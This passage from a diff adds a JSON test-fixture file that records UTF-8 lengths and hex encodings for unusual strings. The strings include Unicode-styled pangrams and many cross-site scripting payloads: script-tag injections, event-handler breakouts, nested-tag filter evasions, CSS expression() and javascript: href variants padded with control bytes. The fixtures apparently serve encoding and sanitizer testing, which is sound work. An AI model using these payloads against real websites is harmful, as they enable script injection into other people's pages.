+    "utf8Hex": "cb99c9906e62e1b4896cc99020c99075c683c990c9af20c79dc9b96f6c6f7020ca87c79d20c79dc9b96f71c9906c20ca876e20ca87756e70e1b48970e1b489c99475e1b48920c9b96f64c9afc79dca8720706fc9af736ee1b489c79d206f702070c79d732027ca87e1b4896cc79d20c68375e1b489c99473e1b48964e1b48970c99020c9b96eca87c79dca87c994c79d73756fc9942027ca87c79dc9afc99020ca87e1b4897320c9b96f6c6f7020c9af6e7364e1b48920c9afc79dc9b96fcba5"
+  },
+  {
+    "input": "00˙Ɩ$-",
+    "utf8Length": 8,
+    "utf8Hex": "3030cb99c696242d"
+  },
+  {
+    "input": "Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ",
+    "utf8Length": 113,
+    "utf8Hex": "efbcb4efbd88efbd8520efbd91efbd95efbd89efbd83efbd8b20efbd82efbd92efbd8fefbd97efbd8e20efbd86efbd8fefbd9820efbd8aefbd95efbd8defbd90efbd9320efbd8fefbd96efbd85efbd9220efbd94efbd88efbd8520efbd8cefbd81efbd9aefbd9920efbd84efbd8fefbd87"
+  },
+  {
+    "input": "𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠",
+    "utf8Length": 148,
+    "utf8Hex": "f09d9093f09d90a1f09d909e20f09d90aaf09d90aef09d90a2f09d909cf09d90a420f09d909bf09d90abf09d90a8f09d90b0f09d90a720f09d909ff09d90a8f09d90b120f09d90a3f09d90aef09d90a6f09d90a9f09d90ac20f09d90a8f09d90aff09d909ef09d90ab20f09d90adf09d90a1f09d909e20f09d90a5f09d909af09d90b3f09d90b220f09d909df09d90a8f09d90a0"
+  },
+  {
+    "input": "𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌",
+    "utf8Length": 148,
+    "utf8Hex": "f09d95bff09d968df09d968a20f09d9696f09d969af09d968ef09d9688f09d969020f09d9687f09d9697f09d9694f09d969cf09d969320f09d968bf09d9694f09d969d20f09d968ff09d969af09d9692f09d9695f09d969820f09d9694f09d969bf09d968af09d969720f09d9699f09d968df09d968a20f09d9691f09d9686f09d969ff09d969e20f09d9689f09d9694f09d968c"
+  },
+  {
+    "input": "𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐𝒘𝒏 𝒇𝒐𝒙 𝒋𝒖𝒎𝒑𝒔 𝒐𝒗𝒆𝒓 𝒕𝒉𝒆 𝒍𝒂𝒛𝒚 𝒅𝒐𝒈",
+    "utf8Length": 148,
+    "utf8Hex": "f09d91bbf09d9289f09d928620f09d9292f09d9296f09d928af09d9284f09d928c20f09d9283f09d9293f09d9290f09d9298f09d928f20f09d9287f09d9290f09d929920f09d928bf09d9296f09d928ef09d9291f09d929420f09d9290f09d9297f09d9286f09d929320f09d9295f09d9289f09d928620f09d928df09d9282f09d929bf09d929a20f09d9285f09d9290f09d9288"
+  },
+  {
+    "input": "𝓣𝓱𝓮 𝓺𝓾𝓲𝓬𝓴 𝓫𝓻𝓸𝔀𝓷 𝓯𝓸𝔁 𝓳𝓾𝓶𝓹𝓼 𝓸𝓿𝓮𝓻 𝓽𝓱𝓮 𝓵𝓪𝔃𝔂 𝓭𝓸𝓰",
+    "utf8Length": 148,
+    "utf8Hex": "f09d93a3f09d93b1f09d93ae20f09d93baf09d93bef09d93b2f09d93acf09d93b420f09d93abf09d93bbf09d93b8f09d9480f09d93b720f09d93aff09d93b8f09d948120f09d93b3f09d93bef09d93b6f09d93b9f09d93bc20f09d93b8f09d93bff09d93aef09d93bb20f09d93bdf09d93b1f09d93ae20f09d93b5f09d93aaf09d9483f09d948220f09d93adf09d93b8f09d93b0"
+  },
+  {
+    "input": "𝕋𝕙𝕖 𝕢𝕦𝕚𝕔𝕜 𝕓𝕣𝕠𝕨𝕟 𝕗𝕠𝕩 𝕛𝕦𝕞𝕡𝕤 𝕠𝕧𝕖𝕣 𝕥𝕙𝕖 𝕝𝕒𝕫𝕪 𝕕𝕠𝕘",
+    "utf8Length": 148,
+    "utf8Hex": "f09d958bf09d9599f09d959620f09d95a2f09d95a6f09d959af09d9594f09d959c20f09d9593f09d95a3f09d95a0f09d95a8f09d959f20f09d9597f09d95a0f09d95a920f09d959bf09d95a6f09d959ef09d95a1f09d95a420f09d95a0f09d95a7f09d9596f09d95a320f09d95a5f09d9599f09d959620f09d959df09d9592f09d95abf09d95aa20f09d9595f09d95a0f09d9598"
+  },
+  {
+    "input": "𝚃𝚑𝚎 𝚚𝚞𝚒𝚌𝚔 𝚋𝚛𝚘𝚠𝚗 𝚏𝚘𝚡 𝚓𝚞𝚖𝚙𝚜 𝚘𝚟𝚎𝚛 𝚝𝚑𝚎 𝚕𝚊𝚣𝚢 𝚍𝚘𝚐",
+    "utf8Length": 148,
+    "utf8Hex": "f09d9a83f09d9a91f09d9a8e20f09d9a9af09d9a9ef09d9a92f09d9a8cf09d9a9420f09d9a8bf09d9a9bf09d9a98f09d9aa0f09d9a9720f09d9a8ff09d9a98f09d9aa120f09d9a93f09d9a9ef09d9a96f09d9a99f09d9a9c20f09d9a98f09d9a9ff09d9a8ef09d9a9b20f09d9a9df09d9a91f09d9a8e20f09d9a95f09d9a8af09d9aa3f09d9aa220f09d9a8df09d9a98f09d9a90"
+  },
+  {
+    "input": "⒯⒣⒠ ⒬⒰⒤⒞⒦ ⒝⒭⒪⒲⒩ ⒡⒪⒳ ⒥⒰⒨⒫⒮ ⒪⒱⒠⒭ ⒯⒣⒠ ⒧⒜⒵⒴ ⒟⒪⒢",
+    "utf8Length": 113,
+    "utf8Hex": "e292afe292a3e292a020e292ace292b0e292a4e2929ee292a620e2929de292ade292aae292b2e292a920e292a1e292aae292b320e292a5e292b0e292a8e292abe292ae20e292aae292b1e292a0e292ad20e292afe292a3e292a020e292a7e2929ce292b5e292b420e2929fe292aae292a2"
+  },
+  {
+    "input": "<script>alert(123)</script>",
+    "utf8Length": 27,
+    "utf8Hex": "3c7363726970743e616c65727428313233293c2f7363726970743e"
+  },
+  {
+    "input": "&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;",
+    "utf8Length": 50,
+    "utf8Hex": "266c743b7363726970742667743b616c65727428262333393b313233262333393b293b266c743b2f7363726970742667743b"
+  },
+  {
+    "input": "<img src=x onerror=alert(123) />",
+    "utf8Length": 32,
+    "utf8Hex": "3c696d67207372633d78206f6e6572726f723d616c6572742831323329202f3e"
+  },
+  {
+    "input": "<svg><script>123<1>alert(123)</script> ",
+    "utf8Length": 39,
+    "utf8Hex": "3c7376673e3c7363726970743e3132333c313e616c65727428313233293c2f7363726970743e20"
+  },
+  {
+    "input": "\"><script>alert(123)</script>",
+    "utf8Length": 29,
+    "utf8Hex": "223e3c7363726970743e616c65727428313233293c2f7363726970743e"
+  },
+  {
+    "input": "'><script>alert(123)</script>",
+    "utf8Length": 29,
+    "utf8Hex": "273e3c7363726970743e616c65727428313233293c2f7363726970743e"
+  },
+  {
+    "input": "><script>alert(123)</script>",
+    "utf8Length": 28,
+    "utf8Hex": "3e3c7363726970743e616c65727428313233293c2f7363726970743e"
+  },
+  {
+    "input": "</script><script>alert(123)</script>",
+    "utf8Length": 36,
+    "utf8Hex": "3c2f7363726970743e3c7363726970743e616c65727428313233293c2f7363726970743e"
+  },
+  {
+    "input": "< / script >< script >alert(123)< / script >",
+    "utf8Length": 44,
+    "utf8Hex": "3c202f20736372697074203e3c20736372697074203e616c65727428313233293c202f20736372697074203e"
+  },
+  {
+    "input": " onfocus=JaVaSCript:alert(123) autofocus ",
+    "utf8Length": 41,
+    "utf8Hex": "206f6e666f6375733d4a6156615343726970743a616c6572742831323329206175746f666f63757320"
+  },
+  {
+    "input": "\" onfocus=JaVaSCript:alert(123) autofocus ",
+    "utf8Length": 42,
+    "utf8Hex": "22206f6e666f6375733d4a6156615343726970743a616c6572742831323329206175746f666f63757320"
+  },
+  {
+    "input": "' onfocus=JaVaSCript:alert(123) autofocus ",
+    "utf8Length": 42,
+    "utf8Hex": "27206f6e666f6375733d4a6156615343726970743a616c6572742831323329206175746f666f63757320"
+  },
+  {
+    "input": "＜script＞alert(123)＜/script＞",
+    "utf8Length": 35,
+    "utf8Hex": "efbc9c736372697074efbc9e616c6572742831323329efbc9c2f736372697074efbc9e"
+  },
+  {
+    "input": "<sc<script>ript>alert(123)</sc</script>ript>",
+    "utf8Length": 44,
+    "utf8Hex": "3c73633c7363726970743e726970743e616c65727428313233293c2f73633c2f7363726970743e726970743e"
+  },
+  {
+    "input": "--><script>alert(123)</script>",
+    "utf8Length": 30,
+    "utf8Hex": "2d2d3e3c7363726970743e616c65727428313233293c2f7363726970743e"
+  },
+  {
+    "input": "\";alert(123);t=\"",
+    "utf8Length": 16,
+    "utf8Hex": "223b616c65727428313233293b743d22"
+  },
+  {
+    "input": "';alert(123);t='",
+    "utf8Length": 16,
+    "utf8Hex": "273b616c65727428313233293b743d27"
+  },
+  {
+    "input": "JavaSCript:alert(123)",
+    "utf8Length": 21,
+    "utf8Hex": "4a6176615343726970743a616c6572742831323329"
+  },
+  {
+    "input": ";alert(123);",
+    "utf8Length": 12,
+    "utf8Hex": "3b616c65727428313233293b"
+  },
+  {
+    "input": "src=JaVaSCript:prompt(132)",
+    "utf8Length": 26,
+    "utf8Hex": "7372633d4a6156615343726970743a70726f6d70742831333229"
+  },
+  {
+    "input": "\"><script>alert(123);</script x=\"",
+    "utf8Length": 33,
+    "utf8Hex": "223e3c7363726970743e616c65727428313233293b3c2f73637269707420783d22"
+  },
+  {
+    "input": "'><script>alert(123);</script x='",
+    "utf8Length": 33,
+    "utf8Hex": "273e3c7363726970743e616c65727428313233293b3c2f73637269707420783d27"
+  },
+  {
+    "input": "><script>alert(123);</script x=",
+    "utf8Length": 31,
+    "utf8Hex": "3e3c7363726970743e616c65727428313233293b3c2f73637269707420783d"
+  },
+  {
+    "input": "\" autofocus onkeyup=\"javascript:alert(123)",
+    "utf8Length": 42,
+    "utf8Hex": "22206175746f666f637573206f6e6b657975703d226a6176617363726970743a616c6572742831323329"
+  },
+  {
+    "input": "' autofocus onkeyup='javascript:alert(123)",
+    "utf8Length": 42,
+    "utf8Hex": "27206175746f666f637573206f6e6b657975703d276a6176617363726970743a616c6572742831323329"
+  },
+  {
+    "input": "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>",
+    "utf8Length": 63,
+    "utf8Hex": "3c7363726970745c783230747970653d22746578742f6a617661736372697074223e6a6176617363726970743a616c6572742831293b3c2f7363726970743e"
+  },
+  {
+    "input": "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>",
+    "utf8Length": 63,
+    "utf8Hex": "3c7363726970745c783345747970653d22746578742f6a617661736372697074223e6a6176617363726970743a616c6572742831293b3c2f7363726970743e"
+  },
+  {
+    "input": "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>",
+    "utf8Length": 63,
+    "utf8Hex": "3c7363726970745c783044747970653d22746578742f6a617661736372697074223e6a6176617363726970743a616c6572742831293b3c2f7363726970743e"
+  },
+  {
+    "input": "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>",
+    "utf8Length": 63,
+    "utf8Hex": "3c7363726970745c783039747970653d22746578742f6a617661736372697074223e6a6176617363726970743a616c6572742831293b3c2f7363726970743e"
+  },
+  {
+    "input": "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>",
+    "utf8Length": 63,
+    "utf8Hex": "3c7363726970745c783043747970653d22746578742f6a617661736372697074223e6a6176617363726970743a616c6572742831293b3c2f7363726970743e"
+  },
+  {
+    "input": "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>",
+    "utf8Length": 63,
+    "utf8Hex": "3c7363726970745c783246747970653d22746578742f6a617661736372697074223e6a6176617363726970743a616c6572742831293b3c2f7363726970743e"
+  },
+  {
+    "input": "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>",
+    "utf8Length": 63,
+    "utf8Hex": "3c7363726970745c783041747970653d22746578742f6a617661736372697074223e6a6176617363726970743a616c6572742831293b3c2f7363726970743e"
+  },
+  {
+    "input": "'`\"><\\x3Cscript>javascript:alert(1)</script>        ",
+    "utf8Length": 52,
+    "utf8Hex": "2760223e3c5c7833437363726970743e6a6176617363726970743a616c6572742831293c2f7363726970743e2020202020202020"
+  },
+  {
+    "input": "'`\"><\\x00script>javascript:alert(1)</script>",
+    "utf8Length": 44,
+    "utf8Hex": "2760223e3c5c7830307363726970743e6a6176617363726970743a616c6572742831293c2f7363726970743e"
+  },
+  {
+    "input": "ABC<div style=\"x\\x3Aexpression(javascript:alert(1)\">DEF",
+    "utf8Length": 55,
+    "utf8Hex": "4142433c646976207374796c653d22785c78334165787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:expression\\x5C(javascript:alert(1)\">DEF",
+    "utf8Length": 56,
+    "utf8Hex": "4142433c646976207374796c653d22783a65787072657373696f6e5c783543286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:expression\\x00(javascript:alert(1)\">DEF",
+    "utf8Length": 56,
+    "utf8Hex": "4142433c646976207374796c653d22783a65787072657373696f6e5c783030286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:exp\\x00ression(javascript:alert(1)\">DEF",
+    "utf8Length": 56,
+    "utf8Hex": "4142433c646976207374796c653d22783a6578705c78303072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:exp\\x5Cression(javascript:alert(1)\">DEF",
+    "utf8Length": 56,
+    "utf8Hex": "4142433c646976207374796c653d22783a6578705c78354372657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\x0Aexpression(javascript:alert(1)\">DEF",
+    "utf8Length": 56,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c78304165787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF",
+    "utf8Length": 56,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c78303965787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF",
+    "utf8Length": 64,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7845335c7838305c78383065787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\">DEF",
+    "utf8Length": 64,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7845325c7838305c78383465787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\">DEF",
+    "utf8Length": 60,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7843325c78413065787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\">DEF",
+    "utf8Length": 64,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7845325c7838305c78383065787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\">DEF",
+    "utf8Length": 64,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7845325c7838305c78384165787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF",
+    "utf8Length": 56,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c78304465787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF",
+    "utf8Length": 56,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c78304365787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\">DEF",
+    "utf8Length": 64,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7845325c7838305c78383765787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\">DEF",
+    "utf8Length": 64,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7845465c7842425c78424665787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\x20expression(javascript:alert(1)\">DEF",
+    "utf8Length": 56,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c78323065787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\">DEF",
+    "utf8Length": 64,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7845325c7838305c78383865787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\x00expression(javascript:alert(1)\">DEF",
+    "utf8Length": 56,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c78303065787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\">DEF",
+    "utf8Length": 64,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7845325c7838305c78384265787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">DEF",
+    "utf8Length": 64,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7845325c7838305c78383665787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">DEF",
+    "utf8Length": 64,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7845325c7838305c78383565787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\">DEF",
+    "utf8Length": 64,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7845325c7838305c78383265787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\x0Bexpression(javascript:alert(1)\">DEF",
+    "utf8Length": 56,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c78304265787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\">DEF",
+    "utf8Length": 64,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7845325c7838305c78383165787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">DEF",
+    "utf8Length": 64,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7845325c7838305c78383365787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "ABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF",
+    "utf8Length": 64,
+    "utf8Hex": "4142433c646976207374796c653d22783a5c7845325c7838305c78383965787072657373696f6e286a6176617363726970743a616c657274283129223e444546"
+  },
+  {
+    "input": "<a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830426a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830466a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 75,
+    "utf8Hex": "3c6120687265663d225c7843325c7841306a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830356a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845315c7841305c7838456a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831386a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831316a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845325c7838305c7838386a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845325c7838305c7838396a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845325c7838305c7838306a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831376a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830336a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830456a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831416a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830306a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831306a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845325c7838305c7838326a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7832306a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831336a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830396a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845325c7838305c7838416a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831346a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831396a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845325c7838305c7841466a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831466a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845325c7838305c7838316a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7831446a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845325c7838305c7838376a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 71,
+    "utf8Hex": "3c6120687265663d225c7830376a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
+    "utf8Hex": "3c6120687265663d225c7845315c7839415c7838306a6176617363726970743a6a6176617363726970743a616c657274283129222069643d2266757a7a656c656d656e7431223e746573743c2f613e"
+  },
+  {
+    "input": "<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
+    "utf8Length": 79,
